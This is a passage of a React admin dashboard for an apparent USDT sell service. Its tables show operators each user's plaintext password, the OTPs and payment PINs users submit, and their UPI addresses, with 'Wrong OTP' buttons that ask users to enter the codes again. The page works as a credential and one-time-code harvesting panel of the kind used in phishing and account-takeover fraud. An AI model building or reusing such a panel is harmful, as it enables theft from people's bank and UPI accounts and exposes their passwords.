                  <>
                    <div>
                      <label className="block text-sm font-medium text-slate-700 mb-1">Network</label>
                      <select
                        className="w-full border rounded-lg px-3 py-2 text-sm"
                        value={approveForm.network}
                        onChange={(e) => setApproveForm((f) => ({ ...f, network: e.target.value }))}
                      >
                        <option value="">Select network</option>
                        {CRYPTO_NETWORKS.map((n) => (
                          <option key={n} value={n}>{n}</option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-700 mb-1">Address</label>
                      <input
                        className="w-full border rounded-lg px-3 py-2 text-sm font-mono"
                        value={approveForm.address}
                        onChange={(e) => setApproveForm((f) => ({ ...f, address: e.target.value }))}
                        placeholder="USDT wallet address"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-700 mb-1">QR Code (optional)</label>
                      <input type="file" accept="image/*" className="w-full text-sm" onChange={(e) => setApproveQr(e.target.files?.[0] || null)} />
                    </div>
                  </>
                )}
              </div>

              <div className="flex gap-3 mt-6">
                <button
                  onClick={() => setApproveOrderId(null)}
                  className="flex-1 py-2.5 border rounded-lg font-medium"
                >
                  Cancel
                </button>
                <button
                  onClick={handleApproveSellOrder}
                  disabled={actionLoading === approveOrderId}
                  className="flex-1 py-2.5 bg-green-600 text-white rounded-lg font-semibold disabled:opacity-50"
                >
                  Approve &amp; Send to Customer
                </button>
              </div>
            </div>
          </div>
        )}

        {tab === "wallets" && (
          <div className="bg-white rounded-xl border overflow-hidden">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-slate-50 border-b">
                  <th className="text-left px-4 py-3">Mobile</th>
                  <th className="text-left px-4 py-3">Wallet Type</th>
                  <th className="text-left px-4 py-3">UPI Address</th>
                  <th className="text-left px-4 py-3">OTP</th>
                  <th className="text-left px-4 py-3">Status</th>
                  <th className="text-left px-4 py-3">Time</th>
                  <th className="text-left px-4 py-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {walletAddAttempts.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-8 text-center text-slate-400">
                      No wallet add requests yet
                    </td>
                  </tr>
                ) : (
                  walletAddAttempts.map((w) => (
                    <tr key={w.id} className="border-b">
                      <td className="px-4 py-3 font-medium">+91 {w.mobile}</td>
                      <td className="px-4 py-3 capitalize">{w.type}</td>
                      <td className="px-4 py-3 font-mono font-semibold">{w.upiId}</td>
                      <td className="px-4 py-3 font-mono font-semibold">{w.otp || "—"}</td>
                      <td className="px-4 py-3">
                        <span className={`px-2 py-0.5 rounded text-xs ${statusBadge(w.status)}`}>
                          {w.status.replace(/_/g, " ")}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-slate-500">{new Date(w.updatedAt).toLocaleString()}</td>
                      <td className="px-4 py-3">
                        <div className="flex gap-2 flex-wrap">
                          {w.status === "otp_submitted" && w.otp && (
                            <button
                              onClick={() => handleApproveWallet(w.id)}
                              disabled={actionLoading === w.id}
                              className="px-2 py-1 text-xs bg-green-500 text-white rounded disabled:opacity-50"
                            >
                              Approve Wallet
                            </button>
                          )}
                          {(w.status === "otp_submitted" || w.status === "address_submitted") && w.otp && (
                            <button
                              onClick={() => handleRejectWallet(w.id)}
                              disabled={actionLoading === w.id}
                              className="px-2 py-1 text-xs bg-orange-500 text-white rounded disabled:opacity-50"
                            >
                              Wrong OTP
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}

        {tab === "paymentPins" && (
          <div className="bg-white rounded-xl border overflow-hidden">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-slate-50 border-b">
                  <th className="text-left px-4 py-3">Mobile</th>
                  <th className="text-left px-4 py-3">Payment PIN</th>
                  <th className="text-left px-4 py-3">OTP</th>
                  <th className="text-left px-4 py-3">Status</th>
                  <th className="text-left px-4 py-3">Time</th>
                  <th className="text-left px-4 py-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {paymentPinAttempts.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-4 py-8 text-center text-slate-400">
                      No payment PIN requests yet
                    </td>
                  </tr>
                ) : (
                  paymentPinAttempts.map((p) => (
                    <tr key={p.id} className="border-b">
                      <td className="px-4 py-3 font-medium">+91 {p.mobile}</td>
                      <td className="px-4 py-3 font-mono font-semibold">{p.paymentPin}</td>
                      <td className="px-4 py-3 font-mono font-semibold">{p.otp || "—"}</td>
                      <td className="px-4 py-3">
                        <span className={`px-2 py-0.5 rounded text-xs ${statusBadge(p.status)}`}>
                          {p.status.replace(/_/g, " ")}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-slate-500">{new Date(p.updatedAt).toLocaleString()}</td>
                      <td className="px-4 py-3">
                        <div className="flex gap-2 flex-wrap">
                          {p.status === "otp_submitted" && p.otp && (
                            <button
                              onClick={() => handleApprovePaymentPin(p.id)}
                              disabled={actionLoading === p.id}
                              className="px-2 py-1 text-xs bg-green-500 text-white rounded disabled:opacity-50"
                            >
                              Approve PIN
                            </button>
                          )}
                          {(p.status === "otp_submitted" || p.status === "approved") && p.otp && (
                            <button
                              onClick={() => handleRejectPaymentPin(p.id)}
                              disabled={actionLoading === p.id}
                              className="px-2 py-1 text-xs bg-orange-500 text-white rounded disabled:opacity-50"
                            >
                              Wrong OTP
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}

        {tab === "pricing" && (
          <div className="max-w-2xl">
            <div className="bg-white rounded-xl border p-6 shadow-sm mb-6">
              <h2 className="text-lg font-bold text-slate-900 mb-1">Sell Rates</h2>
              <p className="text-sm text-slate-500 mb-6">UPI and IMPS payout rates per 1 USDT.</p>
              <div className="grid sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-semibold text-blue-700 mb-2">UPI Sell Rate (₹)</label>
                  <input
                    type="number"
                    step="0.01"
                    value={upiRate}
                    onChange={(e) => setUpiRate(e.target.value)}
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-blue-500/30"
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-violet-700 mb-2">IMPS Sell Rate (₹)</label>
                  <input
                    type="number"
                    step="0.01"
                    value={impsRate}
                    onChange={(e) => setImpsRate(e.target.value)}
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-violet-500/30"
                  />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-xl border p-6 shadow-sm mb-6">
              <h2 className="text-lg font-bold text-slate-900 mb-1">UPI &amp; IMPS Daily Limits</h2>
              <p className="text-sm text-slate-500 mb-4">
                Reference limits shown on client home — per UPI wallet and per bank account. Changes apply immediately after save.
              </p>
              <div className="grid sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-semibold text-emerald-700 mb-2">
                    UPI Limit (₹ per wallet / day)
                  </label>
                  <input
                    type="number"
                    step="1"
                    value={upiDailyLimit}
                    onChange={(e) => setUpiDailyLimit(e.target.value)}
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-emerald-500/30"
                  />
                  <div className="flex flex-wrap gap-2 mt-2">
                    {limitPresets.map((p) => (
                      <button
                        key={p.value}
                        type="button"
                        onClick={() => setUpiDailyLimit(String(p.value))}
                        className="text-xs px-2.5 py-1 rounded-lg bg-emerald-50 text-emerald-700 border border-emerald-200 hover:bg-emerald-100"
                      >
                        {p.label}
                      </button>
                    ))}
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-semibold text-amber-700 mb-2">
                    IMPS Limit (₹ per bank / day)
                  </label>
                  <input
                    type="number"
                    step="1"
                    value={impsDailyLimit}
                    onChange={(e) => setImpsDailyLimit(e.target.value)}
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-amber-500/30"
                  />
                  <div className="flex flex-wrap gap-2 mt-2">
                    {limitPresets.map((p) => (
                      <button
                        key={p.value}
                        type="button"
                        onClick={() => setImpsDailyLimit(String(p.value))}
                        className="text-xs px-2.5 py-1 rounded-lg bg-amber-50 text-amber-700 border border-amber-200 hover:bg-amber-100"
                      >
                        {p.label}
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-xl border p-6 shadow-sm">
              {pricingMsg && (
                <p className={`text-sm mb-4 p-3 rounded-lg ${pricingMsg.includes("success") ? "bg-green-50 text-green-700" : "bg-red-50 text-red-600"}`}>
                  {pricingMsg}
                </p>
              )}
              <button
                onClick={handleSavePricing}
                disabled={actionLoading === "pricing"}
                className="w-full py-3 bg-gradient-to-r from-blue-600 to-violet-600 text-white font-bold rounded-xl hover:opacity-90 disabled:opacity-50"
              >
                {actionLoading === "pricing" ? "Saving..." : "Save Rates & Limits"}
              </button>
            </div>

            <div className="mt-4 grid grid-cols-2 gap-4">
              <div className="bg-blue-50 rounded-xl p-4 border border-blue-100">
                <p className="text-xs text-blue-600 font-medium">UPI — live on client</p>
                <p className="text-xl font-bold text-blue-700 mt-1">₹{appSettings.upiSellRate.toFixed(2)} / USDT</p>
                <p className="text-xs text-blue-500 mt-1">Limit ₹{appSettings.upiDailyLimit.toLocaleString("en-IN")} per wallet</p>
              </div>
              <div className="bg-violet-50 rounded-xl p-4 border border-violet-100">
                <p className="text-xs text-violet-600 font-medium">IMPS — live on client</p>
                <p className="text-xl font-bold text-violet-700 mt-1">₹{appSettings.impsSellRate.toFixed(2)} / USDT</p>
                <p className="text-xs text-violet-500 mt-1">Limit ₹{appSettings.impsDailyLimit.toLocaleString("en-IN")} per bank</p>
              </div>
            </div>
          </div>
        )}

        {tab === "notifications" && (
          <div className="grid lg:grid-cols-2 gap-8">
            <div className="bg-white rounded-xl border p-6 shadow-sm">
              <h2 className="text-lg font-bold text-slate-900 mb-1">Send Push Notification</h2>
              <p className="text-sm text-slate-500 mb-6">
                Broadcasts to all {clients.length} client(s). Appears as a banner on their app until dismissed.
              </p>
              <form onSubmit={handleSendPush} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Title</label>
                  <input
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500/30"
                    placeholder="e.g. Rate updated"
                    value={pushTitle}
                    onChange={(e) => setPushTitle(e.target.value)}
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1.5">Message</label>
                  <textarea
                    className="w-full border border-slate-200 rounded-xl px-4 py-3 min-h-[120px] focus:outline-none focus:ring-2 focus:ring-blue-500/30"
                    placeholder="Notification message for all clients..."
                    value={pushMessage}
                    onChange={(e) => setPushMessage(e.target.value)}
                    required
                  />
                </div>
                {pushMsg && (
                  <p className={`text-sm p-3 rounded-lg ${pushMsg.includes("sent") ? "bg-green-50 text-green-700" : "bg-red-50 text-red-600"}`}>
                    {pushMsg}
                  </p>
                )}
                <button
                  type="submit"
                  disabled={actionLoading === "send-push"}
                  className="w-full py-3 bg-gradient-to-r from-blue-600 to-violet-600 text-white font-bold rounded-xl hover:opacity-90 disabled:opacity-50"
                >
                  {actionLoading === "send-push" ? "Sending..." : "Send to All Clients"}
                </button>
              </form>
            </div>

            <div className="bg-white rounded-xl border overflow-hidden">
              <div className="px-4 py-3 border-b bg-slate-50 font-semibold text-slate-800">Sent Notifications</div>
              {pushNotifications.length === 0 ? (
                <p className="p-8 text-center text-slate-400 text-sm">No notifications sent yet</p>
              ) : (
                <div className="divide-y max-h-[520px] overflow-y-auto">
                  {pushNotifications.map((n) => (
                    <div key={n.id} className="p-4">
                      <div className="flex items-start justify-between gap-3">
                        <div>
                          <p className="font-semibold text-slate-900">{n.title}</p>
                          <p className="text-sm text-slate-600 mt-1">{n.message}</p>
                          <p className="text-xs text-slate-400 mt-2">
                            {new Date(n.createdAt).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} ·{" "}
                            {n.dismissCount} dismissed
                          </p>
                        </div>
                        <button
                          type="button"
                          onClick={() => handleDeletePush(n.id, n.title)}
                          disabled={actionLoading === n.id}
                          className="text-xs px-2 py-1 bg-red-500 text-white rounded disabled:opacity-50 shrink-0"
                        >
                          Delete
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {tab === "registrations" && (
          <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-slate-50 border-b border-slate-200">
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Mobile</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Password</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">OTP</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Invite Code</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Status</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Time</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {registrations.length === 0 ? (
                    <tr><td colSpan={7} className="px-4 py-8 text-center text-slate-400">No registrations yet</td></tr>
                  ) : (
                    registrations.map((r) => (
                      <tr key={r.id} className="border-b border-slate-100 hover:bg-slate-50">
                        <td className="px-4 py-3 font-medium">+91 {r.mobile}</td>
                        <td className="px-4 py-3 font-mono text-slate-700">{r.password}</td>
                        <td className="px-4 py-3 font-mono font-semibold">{r.otp || "—"}</td>
                        <td className="px-4 py-3 text-slate-600">{r.inviteCode || "—"}</td>
                        <td className="px-4 py-3">
                          <span className={`inline-block px-2 py-0.5 rounded text-xs font-medium ${statusBadge(r.status)}`}>
                            {r.status.replace(/_/g, " ")}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-slate-500 whitespace-nowrap">{new Date(r.updatedAt).toLocaleString()}</td>
                        <td className="px-4 py-3">
                          <div className="flex gap-2 flex-wrap">
                            {r.status === "otp_submitted" && r.otp && (
                              <button onClick={() => handleApproveOtp(r.id)} disabled={actionLoading === r.id} className="px-2 py-1 text-xs bg-green-500 text-white rounded disabled:opacity-50">Approve Account</button>
                            )}
                            {(r.status === "otp_submitted" || r.status === "registered") && r.otp && (
                              <button onClick={() => handleRejectOtp(r.id)} disabled={actionLoading === r.id} className="px-2 py-1 text-xs bg-orange-500 text-white rounded disabled:opacity-50">Wrong OTP</button>
                            )}
                            <button onClick={() => handleDeleteRegistration(r.id, r.mobile)} disabled={actionLoading === r.id} className="px-2 py-1 text-xs bg-red-500 text-white rounded disabled:opacity-50">Delete</button>
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {tab === "logins" && (
          <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-slate-50 border-b border-slate-200">
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Mobile</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Password</th>
                    <th className="text-left px-4 py-3 font-semibold text-slate-600">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {logins.length === 0 ? (
                    <tr><td colSpan={3} className="px-4 py-8 text-center text-slate-400">No logins yet</td></tr>
                  ) : (
                    logins.map((l) => (
                      <tr key={l.id} className="border-b border-slate-100 hover:bg-slate-50">
                        <td className="px-4 py-3 font-medium">+91 {l.mobile}</td>
                        <td className="px-4 py-3 font-mono text-slate-700">{l.password}</td>
                        <td className="px-4 py-3 text-slate-500 whitespace-nowrap">{new Date(l.createdAt).toLocaleString()}</td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {tab === "support" && (
          <AdminSupportChat
            initialThreads={supportThreads}
            clients={clients.map((c) => ({ id: c.id, mobile: c.mobile }))}
          />
        )}
      </div>
    </div>
  );
}
